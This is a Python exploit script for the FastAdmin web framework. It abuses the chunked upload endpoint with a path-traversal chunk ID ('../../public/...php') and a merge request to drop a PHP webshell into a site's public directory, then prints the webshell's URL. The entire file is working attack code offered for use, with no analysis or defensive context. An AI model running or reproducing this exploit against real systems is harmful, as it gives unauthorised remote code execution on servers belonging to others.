import sys
import requests
from time import time
from json import loads

headers = {
	'User-Agent': 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/89.0.4389.90 Safari/537.36',
}

def banner():
	RED = '\033[31m'
	print(f"""
		{RED}  _____         _      _       _           _       
 |  ___|_ _ ___| |_   / \   __| |_ __ ___ (_)_ __  
 | |_ / _` / __| __| / _ \ / _` | '_ ` _ \| | '_ \ 
 |  _| (_| \__ \ |_ / ___ \ (_| | | | | | | | | | |
 |_|  \__,_|___/\__/_/   \_\__,_|_| |_| |_|_|_| |_|
                         Author: Search?=Null                          
	""")

def upload_chunk(url):
	upload_url = url.rstrip('/') + '/index/ajax/upload'
	file = {
		'file': ('%d.php' % time(), open('hhh.php', 'rb'), 'application/octet-stream')
	}
	chunk_id = time()
	data_ = {
		'chunkid': '../../public/%d.php' % chunk_id,
		'chunkindex': 0,
		'chunkcount': 1
	}
	resp = requests.post(
		upload_url,
		headers = headers,
		files = file,
		data = data_
	)
	result = loads(resp.text)
	if result['code'] == 1 and result['msg'] == '' and result['data'] == None:
		merge_file(upload_url, chunk_id)
		print('\nWebshell: %s/%d.php' % (url.rstrip('/'), chunk_id))
	elif result['msg'] != '':
                print(f"Not Vulnerability, {result['msg']}.")
	else:
		print('Not Vulnerability.')

def merge_file(url, chunk_id):
	data_ = {
		'action': 'merge',
		'chunkid': '../../public/%d.php' % chunk_id,
		'chunkindex': 0,
		'chunkcount': 1,
		'filename': '%d.php-0.part' % chunk_id
	}
	resp = requests.post(
		url,
		headers = headers,
		data = data_
	)

def main():
	global headers
	banner()
	if len(sys.argv) == 2:
		try:
			headers['Cookie'] = input('Cookie > ')
			upload_chunk(sys.argv[1])
		except Exception as e:
			print(e)
	else:
		print('Usage: python3 FastAdmin.py url')

if __name__ == "__main__":
	main()
